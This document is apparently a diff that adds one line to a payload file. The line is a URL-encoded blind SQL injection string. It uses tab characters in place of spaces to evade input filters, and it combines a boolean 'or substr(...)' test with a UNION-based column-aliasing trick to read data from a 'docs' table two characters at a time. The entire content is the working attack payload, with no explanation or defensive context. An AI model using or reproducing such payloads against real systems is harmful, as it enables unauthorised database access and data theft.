@@ -1,0 +1,1 @@
+or%09substr((select%09`3`%09from%09(select%091,2,3%09union%09select%09*%09from docs)test%09where%09substr(`3`,1,2)='IS'),1,2)='IS
